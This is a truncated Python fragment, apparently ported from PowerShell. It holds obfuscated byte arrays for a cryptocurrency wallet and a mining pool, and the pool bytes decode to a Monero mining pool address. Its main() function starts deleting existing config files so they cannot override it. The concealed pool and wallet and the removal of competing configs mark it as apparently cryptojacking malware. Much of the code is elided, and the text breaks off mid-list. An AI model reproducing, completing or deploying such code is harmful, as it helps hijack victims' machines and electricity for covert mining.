...
# ========== Obfuscated data (from PowerShell) ==========
ENCODED_WALLET = [
...
ENCODED_POOL = [
    34, 38, 38, 111, 122, 122, 50, 32, 57, 51, 123, 56, 58, 59, 48, 39, 58, 58, 54, 48, 52, 59, 123, 38, 33, 39, 48, 52, 56, 111, 97, 97, 102
]
...
def main():
    ...
    # Delete any existing config files to prevent overriding
    config_paths = [
